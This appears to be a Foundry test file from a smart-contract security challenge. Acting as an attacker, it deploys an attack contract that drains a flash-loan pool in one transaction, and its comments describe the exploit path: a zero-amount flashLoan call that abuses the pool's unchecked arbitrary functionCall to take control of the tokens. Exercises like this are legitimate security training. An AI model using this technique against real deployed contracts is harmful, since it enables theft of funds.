// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FreeFixture.sol";

import "src/src-default/free/AttackFree.sol";

contract FreeTest is FreeFixture {

    AttackFree attackFree;

    function setUp() public override {
        super.setUp();
    }

    function test_free() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
        /*
            ---- We need to drain all the funds from the pool, in one transaction ----
            Again, in one transaction -> Attack contract and everything on the Constructor
            Online 31, target.functionCall(data) we are able to call any function we want in the name of the FreeLenderPool contract
            Moeover, it is not validating if we are actually borrowing any amount, so we can call the flashLoan function with borrowAmount 0
            This allow us to then use the functionCall to get the ownership of the tokens
        */
        attackFree = new AttackFree(address(pool), address(token), TOKENS_IN_POOL);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}